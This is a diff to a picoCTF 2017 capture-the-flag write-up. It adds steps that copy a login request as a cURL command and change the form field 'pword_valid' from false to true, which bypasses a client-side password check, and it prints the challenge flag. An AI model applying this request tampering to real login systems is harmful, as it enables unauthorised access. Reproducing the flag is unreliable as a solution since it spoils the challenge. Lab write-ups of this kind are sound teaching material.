@@ -29,10 +29,17 @@ Heres the easy way. Right click on the Login event, and select copy > Copy as cU
 
 Paste it into notepad++ and your paste should look similar to mine:
 
-curl "http://shell2017.picoctf.com:37907/" -H "Accept-Encoding: gzip, deflate, sdch" -H "Accept-Language: en-US,en;q=0.8" -H "Upgrade-Insecure-Requests: 1" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" -H "Cache-Control: max-age=0" -H "If-None-Match: ^\^"flask-1490944843.36-272-4108915161^\^"" -H "Connection: keep-alive" -H "If-Modified-Since: Fri, 31 Mar 2017 07:20:43 GMT" --compressed &
-curl "http://shell2017.picoctf.com:37907/static/client.js" -H "Referer: http://shell2017.picoctf.com:37907/" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" --compressed &
-curl "http://shell2017.picoctf.com:37907/login" -H "Origin: http://shell2017.picoctf.com:37907" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" -H "Content-type: application/x-www-form-urlencoded" -H "Accept: */*" -H "Referer: http://shell2017.picoctf.com:37907/" -H "Connection: keep-alive" --data "pword_valid=false" --compressed
+>curl "http://shell2017.picoctf.com:37907/login" -H "Origin: http://shell2017.picoctf.com:37907" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" -H "Content-type: application/x-www-form-urlencoded" -H "Accept: */*" -H "Referer: http://shell2017.picoctf.com:37907/" -H "Connection: keep-alive" --data "pword_valid=false" --compressed
 
+cURL transfers data to the server behind this webpage. With the curl command above, we've completely replicated exactly what happens when the "Submit" button is clicked. The only thing we need to change now is that "pword_valid=False" to "pword_valid=true"
+
+so the modified curl command looks like:
+
+>curl "http://shell2017.picoctf.com:37907/login" -H "Origin: http://shell2017.picoctf.com:37907" -H "Accept-Encoding: gzip, deflate" -H "Accept-Language: en-US,en;q=0.8" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" -H "Content-type: application/x-www-form-urlencoded" -H "Accept: */*" -H "Referer: http://shell2017.picoctf.com:37907/" -H "Connection: keep-alive" --data "pword_valid=true" --compressed
+
+Entering the curl command into my Linux terminal, i'm rewarded with what looks to be the flag:
+
+>client_side_is_the_dark_side6295c70148b5939179f1d1b6b70fb0c7
 
 # Resources
-
+https://curl.haxx.se/docs/manpage.html
